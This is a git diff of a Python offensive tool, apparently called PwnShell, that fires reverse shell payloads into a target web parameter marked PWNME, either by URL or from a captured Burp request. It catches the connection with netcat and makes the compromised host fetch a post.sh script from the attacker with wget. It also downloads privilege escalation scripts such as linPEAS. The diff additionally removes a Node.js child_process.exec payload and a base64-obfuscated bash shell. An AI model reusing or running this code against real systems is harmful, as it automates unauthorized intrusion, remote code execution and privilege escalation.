@@ -27,9 +27,9 @@ class PwnShell:
         self.domain = args.url
         self.method = args.method
         self.data = args.data
-        self.authentication = args.auth
         self.type = args.type
         self.file = args.file
+        self.nodejs = args.nodejs
 
         ########################################################################
         ###################### Specifying OS ###################################
@@ -46,20 +46,15 @@ class PwnShell:
         print('[*]LOCAL IP ADDRESS : %s' % self.ip)
         print('[*]LOCAL PORT : %s' % self.port)
         print('[*]TARGET URL : %s' % self.domain)
-        if self.authentication:
-            print('[*]USERNAME : %s' % self.authentication[0])
-            print('[*]PASSWORD : %s' % self.authentication[1])
 
     ####################################################################################
     ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
-        self.nodejs(self)
-        #self.base64_payloads()
-        #self.login()
-        #self.is_valid()
-        #self.thread()  # leave it the last one
+        # self.login()
+        self.is_valid()
+        self.thread()  # leave it the last one
 
     #########################################################################################
     ###################################  WINDOWS #########################################
@@ -89,7 +84,8 @@ class PwnShell:
         print('\n[!]Waiting for a Connection ....\n')
         nc = nclib.Netcat(listen=('', self.port), verbose=True)
         print('\n[*]Downloading PrivESC Scripts From Github..')
-        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
+        os.system(
+            'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
         time.sleep(5)
         nc.send_line(b"export TERM=xterm-256color")
         send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
@@ -117,19 +113,21 @@ class PwnShell:
         listen = Thread(target=self.listener)
         sendpayload = Thread(target=self.send_payload)
         httpserver = Thread(target=self.http_server)
-        burp= Thread(target=self.parse_file)
+        if self.file:
+            burp = Thread(target=self.parse_file)
+            burp.daemon = True
+            burp.start()
         listen.daemon = True
         sendpayload.daemon = True
         httpserver.daemon = True
-        burp.daemon=True
-        burp.start()
         listen.start()
         sendpayload.start()
         httpserver.start()
-        burp.join()
         httpserver.join()
         listen.join()
         sendpayload.join()
+        if self.file:
+            burp.join()
 
     ##########################################################################################
     #################################  CHECK IF PORT IS IN USE ##############################
@@ -146,62 +144,50 @@ class PwnShell:
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
-        payloads = PayLoads(self.ip, self.port).payloads()
-        if self.method == 'post' or self.method == 'POST':
+        payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
+        if not self.file:
             for payload in payloads:
-                self.req_post(payload)
-                time.sleep(5)
+                self.send_request(payload)
+                time.sleep(2)  # Change this ASAP !!!
                 if self.is_port_in_use():
                     break
                 # Here we have to stop the loop after getting a shell in the second thread
-        elif self.method == 'get' or self.method == 'GET':
-            print('get method')
-            for payload in payloads:
-                self.req_get(payload)
-        elif self.file:
-            self.parse_file()  # this also sends the request
-
-
-        else:
-            return False
 
     #########################################################################################
-    ###################################  POST METHOD #########################################
-    def req_post(self, payload):
+    ###################################  Send The Request #########################################
+    def send_request(self, payload):
         if self.domain:
             encoded_payload = self.get_url_encoded_payload(payload)
             print(f'Trying: {payload}')
             url = self.domain.replace('PWNME', encoded_payload)
             proxies = {'http': 'http://127.0.0.1:8080'}
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
+                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                       "Upgrade-Insecure-Requests": "1",
+                       'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
             cookies = ''
-            if self.data:
-                data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't chang
-            else:
-                data_parsed = None
+            if self.method == 'post' or self.method == 'POST':
+                if self.data:
+                    data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't chang
+                else:
+                    data_parsed = None
                 r = requests.post(url, headers=headers, data=data_parsed,
-                    cookies=cookies, verify=False)
-
-    #########################################################################################
-    ###################################  GET METHOD #########################################
-    def req_get(self, payload):
-        if self.domain:
-            print(f'Trying: {payload}')
-            encoded_payload = self.get_url_encoded_payload(payload)
-            # payload will be the revshells
-            url = self.domain.replace('PWNME', self.payload)
-            proxies = {'http': 'http://127.0.0.1:8080'}
-            cookies = ''
-            r = requests.get(url, cookies=cookies, verify=False)
+                                  cookies=cookies, verify=False)
+            else:
+                r = requests.get(url, cookies=cookies, verify=False)
 
     #########################################################################################
     ###################################  LOGIN   ############################################
 
-    def login(self):   #ADD a condition so that if the post data isnt provided he must provide
+    def login(self):  # ADD a condition so that if the post data isnt provided he must provide
         url = self.domain
         data = self.data
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}
-        req=requests.post(url,headers=headers,data=data)
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
+                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                   "Upgrade-Insecure-Requests": "1", 'Content-Type': 'application/x-www-form-urlencoded'}
+        req = requests.post(url, headers=headers, data=data)
 
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
@@ -215,39 +201,20 @@ class PwnShell:
                 if request[r] == "PWNME":
                     request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
                 if r == "Host":
-                    url = 'http://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
-                    
+                    url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
+
             if post_data:
                 url = url.replace("PWNME", encoded_payload)
                 post_data = post_data.replace("PWNME", encoded_payload)
-                req =requests.post(url,headers=request,data=post_data,verify=False)
+                req = requests.post(url, headers=request, data=post_data, verify=False)
                 print(req.status_code)
                 print(encoded_payload)
             else:
                 url = url.replace("PWNME", encoded_payload)
                 print(url)
-                req = requests.get(url,headers=request,verify=False)
+                req = requests.get(url, headers=request, verify=False)
                 print(req.status_code)
             time.sleep(5)
-
-    #########################################################################################
-    ###################################  NODEJS PAYLOADS ####################################
-    def nodejs(self,payload):
-        payloads = PayLoads(self.ip, self.port).payloads()
-        for ini_payload in payloads:
-            encoded_payload = self.get_url_encoded_payload(ini_payload)
-            nodejs_payload=f'''require('child_process').exec('{encoded_payload}')'''
-            print(payload)
-
-    #############################################################################################
-    ###################################  BASE64 ENCODING PAYLOADS ###############################
-    def base64_payloads(self):
-        payloads = PayLoads(self.ip, self.port).payloads()
-        for payload in payloads:
-            cli = payload.encode("utf-8")
-            encoded = base64.b64encode(cli).decode('utf-8')
-            base64_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
-            return base64_payload
 
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
@@ -281,7 +248,7 @@ if __name__ == '__main__':
             parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
         except:
             ip_address = None
-            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS',required=True)
+            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
         parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
         parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
         parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
